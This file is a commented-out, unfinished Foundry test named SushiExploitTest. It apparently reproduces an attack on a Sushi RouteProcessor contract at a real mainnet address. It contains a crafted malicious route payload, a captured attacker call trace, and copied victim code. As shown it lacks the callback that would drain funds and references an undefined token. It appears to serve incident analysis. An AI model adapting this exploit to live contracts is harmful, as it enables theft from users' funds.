// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.13;

// // import "forge-std/Test.sol";
// import './interfaces/IUniswapV2Pair.sol';
// import './interfaces/IUniswapV3Pool.sol';
// import './interfaces/ITridentCLPool.sol';
// import './interfaces/IBentoBoxMinimal.sol';
// import './interfaces/IPool.sol';
// import './interfaces/IWETH.sol';
// import './interfaces/InputStream.sol';

// interface IProcessRoute {
//     // function processRoute(
//     //     address tokenIn,
//     //     uint256 amountIn,
//     //     address tokenOut,
//     //     uint256 amountOutMin,
//     //     address to,
//     //     bytes memory route
//     //   ) external payable lock returns (uint256 amountOut) {
//     //     return processRouteInternal(tokenIn, amountIn, tokenOut, amountOutMin, to, route);
//     //   }
//     function processRoute(
//         address tokenIn,
//         uint256 amountIn,
//         address tokenOut,
//         uint256 amountOutMin,
//         address to,
//         bytes memory route
//     ) external payable returns (uint256 amountOut);
// }

// contract SushiExploitTest is Test {
//     // using SafeERC20 for IERC20;
//     using InputStream for uint256;
//     IProcessRoute public processRoute;
//     IBentoBoxMinimal public bentoBox;
//     address private lastCalledPool;

//     address constant NATIVE_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
//     address constant IMPOSSIBLE_POOL_ADDRESS = 0x0000000000000000000000000000000000000001;

//     /// @dev The minimum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MIN_TICK)
//     uint160 constant MIN_SQRT_RATIO = 4295128739;
//     /// @dev The maximum value that can be returned from #getSqrtRatioAtTick. Equivalent to getSqrtRatioAtTick(MAX_TICK)
//     uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    

//     function run() public {
//         testExploit();
//     }

//     function setUp() public{
//         bentoBox = IBentoBoxMinimal(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
//         processRoute = IProcessRoute(0x044b75f554b886A065b9567891e45c79542d7357);
//         lastCalledPool = IMPOSSIBLE_POOL_ADDRESS;

//     }

//     // uniswapV3 
//     // function swapUniV3(uint256 stream, address from, address tokenIn, uint256 amountIn) private {
//     //     address pool = stream.readAddress();
//     //     bool zeroForOne = stream.readUint8() > 0;
//     //     address recipient = stream.readAddress();
    
//     //     lastCalledPool = pool;
//     //     IUniswapV3Pool(pool).swap(
//     //       recipient,
//     //       zeroForOne,
//     //       int256(amountIn),
//     //       zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1,
//     //       abi.encode(tokenIn, from)
//     //     );
//     //     require(lastCalledPool == IMPOSSIBLE_POOL_ADDRESS, 'RouteProcessor.swapUniV3: unexpected'); // Just to be sure
//     //   }


//     function testExploit() public {
//         // {
//         //     "[FUNCTION]": "processRouteInternal",
//         //     "[OPCODE]": "JUMP",
//         //     "contract": {
//         //       "address": "0x044b75f554b886a065b9567891e45c79542d7357"
//         //     },
//         //     "caller": {
//         //       "address": "0x000000c0524f353223d94fb76efab586a2ff8664",
//         //       "balance": "0"
//         //     },
//         //     "input": {
//         //       "tokenIn": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
//         //       "amountIn": "0",
//         //       "tokenOut": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
//         //       "amountOutMin": "0",
//         //       "to": "0x0000000000000000000000000000000000000000",
//         //       "route": "0x01514910771af9ca656af840dff83e8264ecf986ca01000001000000c0524f353223d94fb76efab586a2ff8664000000000000000000000000000000000000000000"
//         //     },
//         //     "output": {
//         //       "amountOut": "0"
//         //     },
//         //     "gas": {
//         //       "gas_left": 144577,
//         //       "gas_used": 42375,
//         //       "total_gas_used": 175756
//         //     }
//         //   }
                
//     //       "route": "0x01514910771af9ca656af840dff83e8264ecf986ca01000001000000c0524f353223d94fb76efab586a2ff8664000000000000000000000000000000000000000000"

//         // 0x01514910771af9ca656af840dff83e8264ecf986ca01000001000000c0524f353223d94fb76efab586a2ff8664000000000000000000000000000000000000000000 
//         // 0x01514910771af9ca656af840dff83e8264ecf986ca01000001000000c0524f353223d94fb76efab586a2ff8664000000000000000000000000000000000000000000
    
//         uint8 commandCode = 1;
//         uint8 num = 1;
//         uint16 share = 0;
//         uint8 poolType = 1;
//         address pool = address(this);
//         uint8 zeroForOne = 0;
//         address recipient = address(0);
//         // 17007841
//         bytes memory route = abi.encodePacked(
//             commandCode,
//             address(LINK),
//             num,
//             share,
//             poolType,
//             pool,
//             zeroForOne,
//             recipient
//         );
        
//         // createStream test
//         uint256 stream = InputStream.createStream(route);
//         emit log_named_uint("stream", stream);

//         // stream read address
//         address tokenIn = stream.readAddress();
//         emit log_named_address("tokenIn", tokenIn);

//         // stream poolType check 
//         poolType = stream.readUint8();
//         emit log_named_uint("poolType", poolType);


//         // amount token address => cehck 

//         processRoute.processRoute(
//             NATIVE_ADDRESS,
//             0,
//             NATIVE_ADDRESS,
//             0,
//             address(0),
//             route
//         );

//         // [Step1-5] InputStream.createStream(route);

//         // [Step2] Call the ProcessRouteInternal
//         // function processRouteInternal(
//         //     address tokenIn,
//         //     uint256 amountIn,
//         //     address tokenOut,
//         //     uint256 amountOutMin,
//         //     address to,
//         //     bytes memory route
//         //   ) private returns (uint256 amountOut) {
//         //     uint256 balanceInInitial = tokenIn == NATIVE_ADDRESS ? address(this).balance : IERC20(tokenIn).balanceOf(msg.sender);
//         //     uint256 balanceOutInitial = tokenOut == NATIVE_ADDRESS ? address(to).balance : IERC20(tokenOut).balanceOf(to);
        
//         //     uint256 stream = InputStream.createStream(route);
//         //     while (stream.isNotEmpty()) {
//         //       uint8 commandCode = stream.readUint8();
//         //       if (commandCode == 1) processMyERC20(stream);
//         //       else if (commandCode == 2) processUserERC20(stream, amountIn);
//         //       else if (commandCode == 3) processNative(stream);
//         //       else if (commandCode == 4) processOnePool(stream);
//         //       else if (commandCode == 5) processInsideBento(stream);
//         //       else revert('RouteProcessor: Unknown command code');
//         //     }

//         // /// @notice Processes ERC20 token from this contract balance:
//         // /// @notice Call swap for all pools that swap from this token
//         // /// @param stream Streamed process program
//         // function processMyERC20(uint256 stream) private {
//         //     address token = stream.readAddress();
//         //     uint256 amountTotal = IERC20(token).balanceOf(address(this));
//         //     unchecked {
//         //     if (amountTotal > 0) amountTotal -= 1;     // slot undrain protection
//         //     }
//         //     distributeAndSwap(stream, address(this), token, amountTotal);
//         // }
//     }

//     receive() external payable {}

// }